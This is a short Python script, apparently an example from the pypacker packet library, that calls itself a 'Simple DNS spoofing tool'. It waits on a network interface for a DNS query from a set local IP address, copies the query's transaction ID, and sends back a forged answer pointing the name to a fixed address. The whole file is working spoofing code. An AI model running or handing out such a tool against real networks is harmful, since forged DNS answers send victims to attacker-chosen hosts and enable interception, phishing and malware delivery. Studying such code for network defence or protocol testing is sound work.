"""Simple DNS spoofing tool."""
from pypacker.layer12.ethernet import Ethernet
from pypacker.layer3 import ip
from pypacker.layer4.udp import UDP
from pypacker.layer567 import dns
from pypacker import pypacker
from pypacker import psocket

import struct

# interface to listen on
IFACE	= "eth1"
# source address which commits a DNS request and we send a wrong answer
IP_SRC	= "192.168.178.27"

#
# normal DNS request
#
#psock_req	= psocket.SocketHndl(iface_name=IFACE, mode=psocket.SocketHndl.MODE_LAYER_3)
#dns_req		= ip.IP(src_s=IP_SRC, dst_s="192.168.178.1", p=ip.IP_PROTO_UDP) +\
#			UDP(sport=12345, dport=53) +\
#			dns.DNS(id=12, questions_amount=1, addrr_amount=1,
#				queries=dns.DNS.Query(name=b"www.pr0gramm.com"))

#answer	= psock_req.sr(dns_req)[0][dns.DNS]
#print("answer is: %s" % answer)
#psock_req.close()


#
# spoof DNS response
#
print("waiting for DNS request")
psock	= psocket.SocketHndl(iface_name=IFACE, timeout=600)
filter	= lambda p: p[dns.DNS] is not None and p[ip.IP].src_s == IP_SRC
answer	= psock.recvp(filter_match_recv=filter)[0]
answer_dns	= answer[dns.DNS]

print("got DNS packet: %s" % answer_dns)

dns_answer_send	= answer.create_reverse()
layer_dns	= dns_answer_send[dns.DNS]
layer_dns.id	= answer_dns.id
layer_dns.flags	= 0x8180
layer_dns.queries = answer_dns.queries[0]
layer_dns.answers = dns.DNS.Answer(address=pypacker.ip4_str_to_bytes("173.194.70.1"))
#layer_dns.addrecords = answer_dns.addrecords[0]
layer_dns.addrecords = dns.DNS.AddRecord()
layer_dns.addrecords[0].type = 0x0029
layer_dns.addrecords[0].plen = 0x05b4

psock.send(dns_answer_send.bin())
psock.close()
